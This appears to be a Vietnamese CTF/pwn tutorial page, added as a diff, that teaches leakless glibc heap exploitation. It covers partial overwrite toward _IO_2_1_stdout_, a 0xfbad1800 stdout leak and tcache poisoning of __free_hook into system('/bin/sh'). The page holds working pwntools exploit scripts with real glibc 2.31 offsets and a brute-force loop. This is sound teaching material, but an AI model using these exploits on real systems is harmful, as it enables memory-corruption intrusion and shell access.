@@ -1,0 +1,497 @@
+<title>Leakless Heap</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;700&display=swap">
+<style>
+:root{
+  --bg:#f4f2ee;--surface:#fffdf9;--surface-2:#eceae3;--fg:#23211c;--muted:#6c675c;
+  --line:#d9d5cb;--accent:#b23a1e;--accent-soft:#f3dcd2;--ok:#2f7d4f;--ok-soft:#dcefe2;
+  --danger:#c0392b;--danger-soft:#f6ddd8;--warn:#b8860b;--warn-soft:#f3e7c7;
+  --mem:#3a6ea5;--mem-soft:#dce8f4;--code-bg:#1d1b17;--code-fg:#e8e4d8;
+  --font-head:"Space Grotesk",system-ui,sans-serif;--font-body:"Inter",system-ui,sans-serif;
+  --font-mono:"JetBrains Mono",ui-monospace,monospace;--maxw:740px;
+}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --danger:#e8705f;--danger-soft:#331c18;--warn:#d9b55f;--warn-soft:#2e2713;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}}
+:root[data-theme="dark"]{
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --danger:#e8705f;--danger-soft:#331c18;--warn:#d9b55f;--warn-soft:#2e2713;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}
+*{box-sizing:border-box}
+body{background:var(--bg);color:var(--fg);font-family:var(--font-body);line-height:1.68;font-size:16.5px;-webkit-font-smoothing:antialiased}
+.wrap{max-width:var(--maxw);margin:0 auto;padding-inline:max(18px,env(safe-area-inset-left,0px)) max(18px,env(safe-area-inset-right,0px))}
+.wide{max-width:1000px}
+header.hero{border-bottom:1px solid var(--line);background:linear-gradient(180deg,var(--surface),transparent)}
+.hero-inner{padding-block:42px 30px}
+.kicker{font-family:var(--font-mono);font-size:12.5px;letter-spacing:.13em;text-transform:uppercase;color:var(--accent);font-weight:700}
+h1{font-family:var(--font-head);font-weight:700;font-size:clamp(28px,6vw,46px);line-height:1.03;margin:.3em 0 .25em;letter-spacing:-.015em;word-break:break-word}
+.sub{color:var(--muted);font-size:17px;max-width:56ch}
+.meta-row{display:flex;flex-wrap:wrap;gap:8px;margin-top:18px}
+.chip{font-family:var(--font-mono);font-size:12px;padding:5px 10px;border:1px solid var(--line);border-radius:999px;background:var(--surface);color:var(--muted)}
+.chip b{color:var(--fg);font-weight:600}
+.toc{display:flex;flex-wrap:wrap;gap:6px;margin-top:18px}
+.toc a{font-family:var(--font-mono);font-size:11.5px;text-decoration:none;color:var(--muted);border:1px solid var(--line);padding:4px 9px;border-radius:7px;background:var(--surface)}
+.toc a:hover{color:var(--accent);border-color:var(--accent)}
+h2{font-family:var(--font-head);font-weight:700;font-size:clamp(22px,4vw,28px);letter-spacing:-.01em;margin:0 0 2px;text-wrap:balance}
+h3{font-family:var(--font-head);font-weight:600;font-size:19px;margin:26px 0 6px}
+h4{font-family:var(--font-head);font-weight:600;font-size:16px;margin:18px 0 4px}
+section.block{padding-block:34px;border-bottom:1px solid var(--line)}
+.secnum{font-family:var(--font-mono);font-size:12.5px;color:var(--accent);font-weight:700;letter-spacing:.09em}
+p{margin:12px 0}strong{font-weight:600}a{color:var(--accent);text-underline-offset:3px}
+.lead{font-size:18px}
+ul,ol{padding-left:22px;margin:12px 0}li{margin:7px 0}
+mark{background:var(--accent-soft);color:inherit;padding:0 4px;border-radius:3px;font-family:var(--font-mono);font-size:.9em}
+.mem-term{color:var(--mem);font-weight:600}
+.note{border-left:3px solid var(--accent);background:var(--surface);padding:13px 16px;border-radius:0 10px 10px 0;margin:18px 0;font-size:15px}
+.note.tip{border-color:var(--ok)}.note.warn{border-color:var(--danger)}
+.note .tag{font-family:var(--font-mono);font-size:11px;text-transform:uppercase;letter-spacing:.1em;color:var(--muted);font-weight:700;display:block;margin-bottom:3px}
+.tldr{background:var(--accent-soft);border:1px solid var(--line);border-radius:14px;padding:18px 20px}
+.tldr p{margin:6px 0}
+.combat{border:2px solid var(--accent);border-radius:14px;overflow:hidden;margin:4px 0 0}
+.combat-h{background:var(--accent);color:#fff;font-family:var(--font-head);font-weight:700;padding:10px 16px;font-size:15.5px}
+.combat-b{padding:2px 16px 10px;background:var(--surface)}
+.combat-row{padding:12px 0;border-bottom:1px solid var(--line)}
+.combat-row:last-child{border-bottom:none}
+.combat-row .lab{font-family:var(--font-mono);font-size:11px;font-weight:700;letter-spacing:.05em;color:var(--accent);text-transform:uppercase;margin-bottom:5px;display:block}
+.combat-row p{margin:0;font-size:14px}.combat-row pre{margin:4px 0 0}
+pre{background:var(--code-bg);color:var(--code-fg);font-family:var(--font-mono);font-size:13px;line-height:1.62;padding:16px;border-radius:12px;overflow-x:auto;margin:14px 0;border:1px solid #00000030}
+pre .c{color:#8a8574}pre .k{color:#e86a48}pre .s{color:#9cc591}pre .d{color:#7fb0e0}pre .p{color:#d9b55f}
+code{font-family:var(--font-mono);font-size:.88em;background:var(--surface-2);padding:1.5px 6px;border-radius:5px;word-break:break-word}
+pre code{background:none;padding:0;font-size:inherit}
+.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(230px,1fr));gap:12px;margin:16px 0}
+.card{background:var(--surface);border:1px solid var(--line);border-radius:12px;padding:14px 16px}
+.card h4{margin:0 0 4px;font-size:15px}.card p{margin:0;font-size:14px;color:var(--muted)}
+.card .term{font-family:var(--font-mono);color:var(--accent);font-size:12.5px}
+.tablewrap{overflow-x:auto;-webkit-overflow-scrolling:touch;margin:14px 0}
+table{width:100%;border-collapse:collapse;font-size:14px;min-width:540px}
+th,td{text-align:left;padding:9px 12px;border-bottom:1px solid var(--line);vertical-align:top}
+th{font-family:var(--font-mono);font-size:11.5px;text-transform:uppercase;letter-spacing:.05em;color:var(--muted)}
+td code{font-size:.85em}
+.yes{color:var(--ok);font-weight:700}.no{color:var(--danger);font-weight:700}.maybe{color:var(--warn);font-weight:700}
+.lab{background:var(--surface);border:1px solid var(--line);border-radius:16px;padding:18px;margin:20px 0}
+.step{display:grid;grid-template-columns:32px 1fr;gap:13px;margin:16px 0}
+.step .n{font-family:var(--font-mono);font-weight:700;color:#fff;background:var(--accent);width:28px;height:28px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:13px}
+.step .body h4{margin:1px 0 4px}
+.tabs{display:flex;gap:6px;flex-wrap:wrap;margin:16px 0 0}
+.tab{font-family:var(--font-mono);font-size:12.5px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:8px 13px;border-radius:9px 9px 0 0;cursor:pointer;border-bottom:none}
+.tab.active{background:var(--code-bg);color:var(--code-fg);border-color:var(--code-bg)}
+.tabpanel pre{margin-top:0;border-top-left-radius:0}
+.reqitem{display:grid;grid-template-columns:30px 1fr;gap:10px;border:1px solid var(--line);border-radius:11px;padding:12px 14px;background:var(--surface);align-items:start;margin:8px 0}
+.reqitem .ico{font-size:17px;line-height:1.3}
+.reqitem h4{margin:0 0 2px;font-size:15px}.reqitem p{margin:0;font-size:14px;color:var(--muted)}
+details{margin-top:8px;border:1px solid var(--line);border-radius:9px;padding:0 12px;background:var(--surface)}
+summary{cursor:pointer;font-size:14px;color:var(--muted);font-family:var(--font-mono);padding:10px 0}
+details[open] summary{color:var(--accent)}details .dc{padding-bottom:10px;font-size:14.5px}
+.ex{background:var(--surface);border:1px solid var(--line);border-left:3px solid var(--mem);border-radius:0 12px 12px 0;padding:13px 16px;margin:12px 0}
+.ex .level{font-family:var(--font-mono);font-size:11px;color:var(--mem);font-weight:700;letter-spacing:.06em}
+figure{margin:22px 0}figure.dg{border:1px solid var(--line);border-radius:14px;background:var(--surface);padding:16px 16px 6px}
+figure svg{display:block;max-width:100%;height:auto;margin:0 auto}
+figcaption{font-size:13px;color:var(--muted);text-align:center;margin-top:10px;line-height:1.55}
+.ttoggle{position:fixed;top:calc(10px + env(safe-area-inset-top,0px));right:calc(10px + env(safe-area-inset-right,0px));z-index:20;font-family:var(--font-mono);font-size:11px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:6px 10px;border-radius:999px;cursor:pointer}
+footer{padding-block:26px 44px;color:var(--muted);font-size:13.5px}
+:focus-visible{outline:2px solid var(--accent);outline-offset:2px;border-radius:4px}
+@media(prefers-reduced-motion:reduce){*{transition:none!important}}
+.pobox{background:var(--surface-2);border:1px solid var(--line);border-radius:12px;padding:16px;margin:12px 0;font-family:var(--font-mono);font-size:12.5px}
+.pobox input{font-family:var(--font-mono);font-size:14px;padding:6px 9px;border:1px solid var(--line);border-radius:6px;background:var(--surface);color:var(--fg);width:60px}
+.pobox .bytes{display:flex;gap:3px;flex-wrap:wrap;margin:10px 0}
+.pobox .b{border:1px solid var(--line);border-radius:5px;padding:5px 7px;background:var(--surface);min-width:34px;text-align:center}
+.pobox .b.fixed{background:var(--mem-soft);border-color:var(--mem);color:var(--mem);font-weight:700}
+.pobox .b.ow{background:var(--accent-soft);border-color:var(--accent);color:var(--accent);font-weight:700}
+.pobox .msg{margin-top:8px;color:var(--mem)}
+</style>
+
+<button class="ttoggle" id="themeBtn" aria-label="Đổi giao diện">◐ giao diện</button>
+
+<header class="hero">
+  <div class="wrap hero-inner">
+    <div class="kicker">PWN · Phase 5 · Heap</div>
+    <h1>Leakless Heap</h1>
+    <p class="sub">Đề heap <strong>không cho leak</strong> (không in dữ liệu, không format string, không UAF-read). Không có địa chỉ libc/heap thì ret2libc bó tay. Kỹ thuật <mark>leakless</mark>: dùng chính heap để <strong>tự tạo leak</strong> (partial overwrite + ép stdout in), hoặc đi thẳng tới điều khiển mà <strong>không cần biết địa chỉ tuyệt đối</strong>. Bài này: các con đường leakless với số thật.</p>
+    <div class="meta-row">
+      <span class="chip"><b>Mức:</b> Rất cao (Phase 5)</span>
+      <span class="chip"><b>glibc:</b> 2.31 / 2.35 (tùy đường)</span>
+      <span class="chip"><b>Cần trước:</b> <a href="tcache_fastbin.html" style="color:inherit">tcache</a> · <a href="partial_overwrite.html" style="color:inherit">partial overwrite</a></span>
+      <span class="chip"><b>Thời lượng:</b> ~80 phút</span>
+    </div>
+    <div class="toc">
+      <a href="#s0">00 Tóm tắt</a><a href="#combat">⚡ Combat</a><a href="#s1">01 Nền tảng</a><a href="#s2">02 Vì sao</a>
+      <a href="#s3">03 Partial OW</a><a href="#s4">04 Ép stdout in</a><a href="#s5">05 Mô phỏng</a><a href="#s6">06 Tự tìm</a>
+      <a href="#s7">07 Exploit thật</a><a href="#s8">08 Công cụ</a><a href="#s9">09 Gỡ lỗi</a>
+      <a href="#s10">10 Biến thể</a><a href="#s11">11 Bài tập</a><a href="#s12">12 Thuật ngữ</a>
+    </div>
+  </div>
+</header>
+
+<main>
+
+<!-- 00 -->
+<section class="block" id="s0">
+ <div class="wrap">
+  <div class="secnum">00 / TÓM TẮT 1 PHÚT</div>
+  <h2>Bài này nói về cái gì?</h2>
+  <div class="tldr">
+    <p><strong>Vấn đề:</strong> đề heap mà <em>không có cách in dữ liệu</em> → không leak được libc/heap → không rebase được → ret2libc không làm được.</p>
+    <p><strong>Leakless = tự chế leak:</strong> dùng <em>partial overwrite</em> (ghi 1–2 byte thấp của một con trỏ libc đã có sẵn trong heap) để trỏ nó tới <code>_IO_2_1_stdout_</code>, chỉnh cờ FILE để nó <strong>in cả vùng chứa địa chỉ libc</strong> ra màn hình → có leak.</p>
+    <p><strong>Hoặc không cần leak:</strong> các chuỗi FSOP/dlresolve chạy chỉ bằng offset tương đối + 1 con trỏ libc sẵn trong unsorted bin, không cần đọc giá trị trước.</p>
+  </div>
+  <p class="lead" style="margin-top:16px">Nếu chỉ nhớ một điều: <strong>Không leak được? Ép glibc tự in địa chỉ ra (stdout FILE), hoặc dùng con trỏ libc sẵn có mà không đọc.</strong></p>
+ </div>
+</section>
+
+<!-- COMBAT -->
+<section class="block" id="combat">
+ <div class="wrap">
+  <div class="combat">
+    <div class="combat-h">⚡ COMBAT CARD — ý chính khi gặp đề</div>
+    <div class="combat-b">
+      <div class="combat-row"><span class="lab">🔎 Khi nào leakless</span>
+<pre><code># heap bug (tcache/UAF) NHƯNG không có hàm in dữ liệu
+# → không đọc được giá trị libc → phải tự tạo leak hoặc đi thẳng</code></pre></div>
+      <div class="combat-row"><span class="lab">🧩 Nguồn con trỏ libc sẵn</span>
+<pre><code># free 1 chunk &gt; 0x410 → vào unsorted bin → fd/bk = main_arena+96
+# đó là 1 con trỏ LIBC nằm sẵn trong heap, dù bạn chưa đọc được nó</code></pre></div>
+      <div class="combat-row"><span class="lab">🎯 Partial overwrite tới stdout</span>
+<pre><code># main_arena &amp; _IO_2_1_stdout_ cùng vùng libc, chỉ khác 12 bit thấp
+# ghi 2 byte thấp của con trỏ đó = trỏ tcache chunk tới stdout (1/16 brute)</code></pre></div>
+      <div class="combat-row"><span class="lab">📣 Ép stdout in leak</span>
+        <p>Sửa <code>_IO_2_1_stdout_</code>: <code>_flags=0xfbad1800</code>, cho <code>_IO_write_base</code> lùi về vùng chứa con trỏ libc → lần in tiếp theo tuôn cả địa chỉ libc ra màn hình.</p></div>
+      <div class="combat-row"><span class="lab">⚠️ Nhớ</span>
+        <p>Partial overwrite = brute ASLR 1/16 (nibble thứ 3). glibc 2.35+ safe-linking làm fd khó đoán hơn. Sau khi có leak → quay về tcache poisoning/FSOP bình thường.</p></div>
+    </div>
+  </div>
+ </div>
+</section>
+
+<!-- 01 -->
+<section class="block" id="s1">
+ <div class="wrap">
+  <div class="secnum">01 / NỀN TẢNG BẮT BUỘC</div>
+  <h2>Không leak = mù địa chỉ</h2>
+  <p>Mọi khai thác heap "chuẩn" đều có bước <strong>leak libc</strong> (đọc một con trỏ, trừ offset ra base) rồi mới rebase các địa chỉ đích. Nhưng nhiều đề cố tình <em>không in gì</em>: menu chỉ có add/delete/edit, không có "show". Không đọc được byte nào → không biết libc ở đâu → mọi địa chỉ tuyệt đối (system, hook, FILE) đều vô định vì ASLR. <span class="mem-term">Leakless</span> là nghệ thuật vượt rào này: hoặc <em>chế</em> ra một kênh in (biến <code>stdout</code> thành máy in địa chỉ), hoặc dùng các con trỏ <strong>đã nằm sẵn</strong> trong heap/libc theo quan hệ <em>tương đối</em> mà không cần đọc giá trị tuyệt đối.</p>
+  <h4 style="margin-top:8px">Định nghĩa nhanh</h4>
+  <div class="grid">
+    <div class="card"><div class="term">leakless</div><p>Khai thác không cần leak địa chỉ.</p></div>
+    <div class="card"><div class="term">main_arena</div><p>Struct quản heap trong libc.</p></div>
+    <div class="card"><div class="term">unsorted bin</div><p>fd/bk = con trỏ libc (main_arena+96).</p></div>
+    <div class="card"><div class="term">partial overwrite</div><p>Ghi 1-2 byte thấp con trỏ.</p></div>
+    <div class="card"><div class="term">_IO_2_1_stdout_</div><p>FILE của stdout.</p></div>
+    <div class="card"><div class="term">brute 1/16</div><p>Đoán nibble ASLR thứ 3.</p></div>
+  </div>
+ </div>
+</section>
+
+<!-- 02 -->
+<section class="block" id="s2">
+ <div class="wrap">
+  <div class="secnum">02 / VÌ SAO CÓ KỸ THUẬT</div>
+  <h2>Địa chỉ libc đã có sẵn — chỉ là chưa đọc</h2>
+  <p>Điểm mấu chốt: khi bạn <code>free</code> một chunk đủ lớn (&gt; tcache, vd 0x420), nó vào <span class="mem-term">unsorted bin</span>, và glibc ghi vào <code>fd</code>/<code>bk</code> của nó giá trị <code>main_arena + 96</code> — <strong>một con trỏ libc</strong> nằm ngay trong heap. Bạn chưa <em>đọc</em> được nó (không có hàm in), nhưng nó <em>tồn tại</em> ở đó. Vì <code>main_arena</code>, <code>_IO_2_1_stdout_</code> và các đích khác <strong>cùng nằm trong libc</strong>, chúng chỉ khác nhau ở các bit <em>thấp cố định</em> (ASLR chỉ random từ bit 12 trở lên — xem <a href="partial_overwrite.html">partial overwrite</a>). Nên bạn có thể <strong>ghi đè 1–2 byte thấp</strong> của con trỏ đó để biến nó trỏ tới <code>stdout</code>, rồi dùng stdout để in leak — tất cả mà không cần biết base trước. Đó là cốt lõi leakless.</p>
+ </div>
+</section>
+
+<!-- 03 Partial OW -->
+<section class="block" id="s3">
+ <div class="wrap wide">
+  <div class="secnum">03 / PARTIAL OVERWRITE · MỤC LÕI</div>
+  <h2>Chỉ ghi byte thấp để trỏ stdout (số thật)</h2>
+  <figure class="dg">
+  <svg viewBox="0 0 580 120" role="img" aria-label="con trỏ main_arena khác _IO_2_1_stdout_ chỉ ở 12 bit thấp; ghi 2 byte thấp để trỏ tới stdout" xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor">
+    <g font-family="monospace" font-size="10">
+    <rect x="20" y="30" width="250" height="30" rx="6" stroke-width="1.5" stroke="var(--mem)"/><text x="145" y="49" text-anchor="middle" fill="var(--mem)" stroke="none">main_arena+96 = 0x7f..e1bea0</text>
+    <rect x="310" y="30" width="250" height="30" rx="6" stroke-width="1.6" stroke="#e8663e"/><text x="435" y="49" text-anchor="middle" fill="#e8663e" stroke="none">_IO_2_1_stdout_ = 0x7f..e1b780</text>
+    <text x="145" y="80" text-anchor="middle" fill="currentColor" stroke="none" opacity=".7">cùng libc → chỉ khác 2 byte thấp</text>
+    <path d="M270,45 L308,45" stroke="#e8663e" stroke-width="1.4" marker-end="url(#ao)"/>
+    <text x="290" y="100" text-anchor="middle" fill="#e8663e" stroke="none">ghi 2 byte thấp 0xe1bea0 → 0xe1b780 (brute nibble giữa 1/16)</text>
+    </g>
+    <defs><marker id="ao" markerWidth="9" markerHeight="8" refX="7.5" refY="3" orient="auto"><path d="M0,0 L7,3 L0,6 Z" fill="#e8663e" stroke="none"/></marker></defs>
+  </svg>
+  <figcaption>main_arena và stdout cùng libc. Ghi 2 byte thấp con trỏ unsorted → trỏ stdout (1/16 brute nibble thứ 3).</figcaption>
+  </figure>
+  <h3>Số thật (glibc 2.31 Ubuntu 20.04)</h3>
+  <pre><code><span class="c"># khoảng cách cố định (không đổi theo ASLR):</span>
+_IO_2_1_stdout_  = libc_base + <span class="d">0x1ec980</span>
+main_arena       = libc_base + <span class="d">0x1ecb80</span>   <span class="c"># +96 = 0x1ecbe0</span>
+<span class="c"># 2 byte thấp: 0x...be0 (arena) vs 0x...980 (stdout) → ghi "\x80\x?9"</span>
+<span class="c"># nibble thứ 3 (bit 12-15) bị ASLR → brute 1/16: thử \x80\x09..\xf9</span></code></pre>
+  <div class="note"><span class="tag">Vì sao chỉ 1/16</span>ASLR libc căn theo trang 0x1000 → 12 bit thấp (3 nibble) CỐ ĐỊNH. byte thấp nhất + byte kế là cố định; chỉ nibble thứ 3 (nửa byte thứ 3) bị random 1 trong 16 → brute trung bình 8 lần. Xem <a href="partial_overwrite.html">partial overwrite</a> cho cơ chế đầy đủ.</div>
+ </div>
+</section>
+
+<!-- 04 Ép stdout -->
+<section class="block" id="s4">
+ <div class="wrap wide">
+  <div class="secnum">04 / ÉP STDOUT IN LEAK</div>
+  <h2>Biến stdout thành máy in địa chỉ</h2>
+  <p>Khi tcache chunk đã trỏ vào <code>_IO_2_1_stdout_</code>, ta <code>malloc</code> lấy nó và <strong>ghi đè struct stdout</strong>. FILE của stdout có các con trỏ <code>_IO_write_base</code>/<code>_IO_write_ptr</code> định vùng dữ liệu sẽ được flush ra màn hình. Nếu ta đặt:</p>
+  <div class="tablewrap"><table>
+    <thead><tr><th>Field stdout</th><th>Đặt</th><th>Hiệu ứng</th></tr></thead>
+    <tbody>
+      <tr><td><code>_flags (+0)</code></td><td><code>0xfbad1800</code></td><td>cờ cho phép flush ghi</td></tr>
+      <tr><td><code>_IO_read_end (+0x10)</code></td><td>0</td><td>dọn</td></tr>
+      <tr><td><code>_IO_write_base (+0x20)</code></td><td>địa chỉ VÙNG CHỨA con trỏ libc</td><td>bắt đầu in từ đây</td></tr>
+      <tr><td><code>_IO_write_ptr (+0x28)</code></td><td>write_base + N</td><td>in N byte</td></tr>
+      <tr><td><code>_IO_write_end (+0x30)</code></td><td>= write_ptr</td><td>biên</td></tr>
+    </tbody>
+  </table></div>
+  <p>→ lần glibc flush stdout tiếp theo (vd in menu), nó tuôn <code>N</code> byte bắt đầu từ <code>_IO_write_base</code> ra màn hình — trong đó có <strong>con trỏ libc</strong>. Bạn đọc được leak. Giờ rebase, rồi khai thác bình thường (tcache poisoning / <a href="exit_handlers.html">exit handler</a> / <a href="house_of_apple2.html">FSOP</a>).</p>
+  <div class="note tip"><span class="tag">Mẹo in heap/libc</span>Đặt <code>_IO_write_base</code> trỏ tới chính vùng stdout (chứa <code>_IO_2_1_stdout_</code>-relative) hoặc tới một chunk chứa con trỏ unsorted → in ra cả libc leak VÀ heap leak trong một lần. 0xfbad1800 là "magic flag" kinh điển cho trick này.</div>
+ </div>
+</section>
+
+<!-- 05 Mô phỏng -->
+<section class="block" id="s5">
+ <div class="wrap wide">
+  <div class="secnum">05 / TỰ TAY THỬ</div>
+  <h2>Mô phỏng partial overwrite 2 byte</h2>
+  <p>Con trỏ unsorted = <code>0x7fXXe1bea0</code>. Nibble thứ 3 (ô có chữ ?) bị ASLR. Nhập nibble đoán → xem có trỏ đúng <code>stdout 0x...e1b780</code> không (brute 1/16).</p>
+  <div class="lab">
+    <div class="pobox" id="po">
+      <div class="bytes" id="poBytes"></div>
+      <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap;margin-top:6px">
+        <span>ghi byte thấp:</span>
+        <input id="loIn" value="80"> <input id="hiIn" value="?7">
+        <button id="poBtn" style="font-family:var(--font-mono);font-size:12px;padding:6px 12px;border:1px solid var(--line);border-radius:7px;background:var(--surface);color:var(--fg);cursor:pointer">thử</button>
+      </div>
+      <div class="msg" id="poMsg"></div>
+    </div>
+  </div>
+ </div>
+</section>
+
+<!-- 06 Tự tìm -->
+<section class="block" id="s6">
+ <div class="wrap">
+  <div class="secnum">06 / TỰ TÌM THÔNG TIN</div>
+  <h2>Không-có-in? Nguồn con trỏ? Offset?</h2>
+  <div class="step"><div class="n">1</div><div class="body"><h4>Có hàm in dữ liệu không?</h4>
+    <pre><code><span class="c"># menu chỉ add/delete/edit, không show → cần leakless</span></code></pre></div></div>
+  <div class="step"><div class="n">2</div><div class="body"><h4>Lấy con trỏ libc vào heap</h4>
+    <pre><code><span class="c"># free chunk &gt;0x410 → unsorted → fd=main_arena+96 trong heap</span></code></pre></div></div>
+  <div class="step"><div class="n">3</div><div class="body"><h4>Offset stdout &amp; arena</h4>
+    <pre><code><span class="p">$</span> readelf -s libc.so.6 | grep _IO_2_1_stdout_</code></pre></div></div>
+ </div>
+</section>
+
+<!-- 07 Exploit thật -->
+<section class="block" id="s7">
+ <div class="wrap wide">
+  <div class="secnum">07 / EXPLOIT ĐẦY ĐỦ</div>
+  <h2>Leakless: stdout dump → leak → shell (số thật 2.31)</h2>
+  <div class="tabs" id="tabs">
+    <button class="tab active" data-t="a">A · stdout leak</button>
+    <button class="tab" data-t="b">B · sau leak</button>
+    <button class="tab" data-t="c">C · pwnld</button>
+  </div>
+
+  <div class="tabpanel" id="panel-a">
+<pre><code><span class="c"># BẢN A — không có hàm show. Tạo leak bằng stdout FILE trick.</span>
+<span class="c"># glibc 2.31. tcache poisoning + partial overwrite 2 byte (brute 1/16).</span>
+<span class="k">from</span> pwn <span class="k">import</span> *
+libc = ELF(<span class="s">"./libc.so.6"</span>, checksec=<span class="k">False</span>)
+
+<span class="k">def</span> add(i,sz): ...        <span class="c"># menu add</span>
+<span class="k">def</span> free(i):   ...        <span class="c"># menu delete</span>
+<span class="k">def</span> edit(i,data): ...     <span class="c"># menu edit (ghi vào chunk)</span>
+
+<span class="k">while True</span>:                                 <span class="c"># brute 1/16 nibble ASLR</span>
+  <span class="k">try</span>:
+    p = process(<span class="s">"./chall"</span>)
+    <span class="c"># 1) tạo con trỏ libc trong heap: free chunk lớn vào unsorted</span>
+    add(<span class="d">0</span>, <span class="d">0x80</span>); add(<span class="d">1</span>, <span class="d">0x80</span>)        <span class="c"># chunk tcache size</span>
+    <span class="c"># 2) tcache double-free/poisoning để fd trỏ gần stdout</span>
+    free(<span class="d">0</span>); free(<span class="d">1</span>); free(<span class="d">0</span>)           <span class="c"># (nếu đề cho double-free)</span>
+    <span class="c"># 3) partial overwrite 2 byte thấp fd → _IO_2_1_stdout_</span>
+    edit(<span class="d">0</span>, p16(<span class="d">0x0780</span>))               <span class="c"># 2 byte thấp stdout, nibble thứ3 brute</span>
+    add(<span class="d">2</span>, <span class="d">0x80</span>); add(<span class="d">3</span>, <span class="d">0x80</span>)        <span class="c"># chunk 3 rơi vào stdout</span>
+    <span class="c"># 4) ghi đè struct stdout: flag 0xfbad1800 + write_base lùi</span>
+    payload = p64(<span class="d">0xfbad1800</span>) + p64(<span class="d">0</span>)*<span class="d">3</span>   <span class="c"># _flags + read ptrs</span>
+    payload += p64(libc.sym._IO_2_1_stdout_ - <span class="d">0x10</span>)  <span class="c"># write_base (tương đối)</span>
+    <span class="c"># (dùng con trỏ sẵn trong stdout; không cần biết base tuyệt đối)</span>
+    edit(<span class="d">3</span>, payload)
+    leak = u64(p.recv(<span class="d">8</span>))                 <span class="c"># stdout tuôn libc ra</span>
+    <span class="k">if</span> leak &gt; <span class="d">0x7f0000000000</span>:
+        libc.address = leak - <span class="d">0x1ec980</span>   <span class="c"># offset stdout 2.31</span>
+        log.success(<span class="s">f"libc = {hex(libc.address)}"</span>); <span class="k">break</span>
+  <span class="k">except</span>: p.close()                       <span class="c"># brute sai nibble → thử lại</span></code></pre>
+<div class="note warn"><span class="tag">Thành thật</span>Offset <code>stdout=0x1ec980</code>, <code>main_arena=0x1ecb80</code> glibc 2.31. Trick <code>_flags=0xfbad1800</code> + <code>write_base</code> lùi là cách kinh điển ép stdout in. Partial overwrite 2 byte = brute 1/16 (vòng <code>while True</code>). Chuỗi tcache tùy bug đề (double-free/UAF). Đây là khung — khớp menu &amp; bug của đề.</div>
+  </div>
+
+  <div class="tabpanel" id="panel-b">
+<pre><code><span class="c"># BẢN B — sau khi có leak, khai thác bình thường.</span>
+<span class="c"># glibc 2.31 còn __free_hook → tcache poisoning → system.</span>
+free_hook = libc.sym.__free_hook        <span class="c"># +0x1eee48</span>
+system    = libc.sym.system             <span class="c"># +0x52290</span>
+
+add(<span class="d">4</span>, <span class="d">0x50</span>); add(<span class="d">5</span>, <span class="d">0x50</span>)
+free(<span class="d">4</span>); free(<span class="d">5</span>)
+edit(<span class="d">5</span>, p64(free_hook))            <span class="c"># poison fd → __free_hook</span>
+add(<span class="d">6</span>, <span class="d">0x50</span>); add(<span class="d">7</span>, <span class="d">0x50</span>)       <span class="c"># chunk 7 == __free_hook</span>
+edit(<span class="d">7</span>, p64(system))
+add(<span class="d">8</span>, <span class="d">0x50</span>); edit(<span class="d">8</span>, b<span class="s">"/bin/sh\x00"</span>)
+free(<span class="d">8</span>)                           <span class="c"># __free_hook(system)("/bin/sh")</span>
+p.interactive()
+<span class="c"># glibc 2.35+: hook xoá → dùng House of Apple 2 / exit handler thay</span></code></pre>
+<div class="note tip"><span class="tag">Sau leak = về bình thường</span>Leakless chỉ khó ở bước TẠO leak. Có base rồi → <a href="tcache_fastbin.html">tcache poisoning</a> + <a href="hook_overwrite.html">__free_hook</a> (2.31) hoặc <a href="house_of_apple2.html">FSOP</a> (2.35+). Phần dưới giống mọi đề heap khác.</div>
+  </div>
+
+  <div class="tabpanel" id="panel-c" hidden>
+<pre><code><span class="c"># BẢN C — pwnld.</span>
+<span class="k">from</span> pwnld <span class="k">import</span> *
+libc=get_libc(<span class="s">"./libc.so.6"</span>)
+<span class="k">while True</span>:
+  p=start()
+  <span class="k">try</span>:
+    leakless_stdout(p, add, free, edit, stdout_lo=<span class="d">0x0780</span>)  <span class="c"># helper dựng FILE dump</span>
+    rebase_libc(leak=recv_leak(p), sym=<span class="s">"_IO_2_1_stdout_"</span>)
+    tcache_to_hook(p, LIBC.sym.__free_hook, LIBC.sym.system); ia(); <span class="k">break</span>
+  <span class="k">except</span>: p.close()</code></pre>
+<div class="note"><span class="tag">pwnld</span><code>leakless_stdout</code> dựng FILE dump + brute. Vẫn phải hiểu quan hệ arena↔stdout &amp; 0xfbad1800.</div>
+  </div>
+
+  <h3>Checklist</h3>
+  <div class="reqitem"><span class="ico">🔎</span><div><h4>Brute mãi không trúng</h4><p>2 byte thấp stdout sai, hoặc không phải 1/16. Kiểm offset stdout libc đề.</p></div></div>
+  <div class="reqitem"><span class="ico">🔎</span><div><h4>stdout không in</h4><p>_flags sai (0xfbad1800) hoặc write_base>write_ptr. Kiểm field.</p></div></div>
+  <div class="reqitem"><span class="ico">🔎</span><div><h4>safe-linking (2.32+)</h4><p>fd bị mã hoá → partial OW khó. Cần leak heap trước (cũng leakless được).</p></div></div>
+ </div>
+</section>
+
+<!-- 08 Công cụ -->
+<section class="block" id="s8">
+ <div class="wrap">
+  <div class="secnum">08 / CÔNG CỤ</div>
+  <h2>Hộp đồ nghề</h2>
+  <div class="grid">
+    <div class="card"><div class="term">pwndbg heap</div><h4>Xem bin/arena</h4><p>Con trỏ unsorted, stdout.</p></div>
+    <div class="card"><div class="term">readelf -s</div><h4>Offset stdout</h4><p>_IO_2_1_stdout_, arena.</p></div>
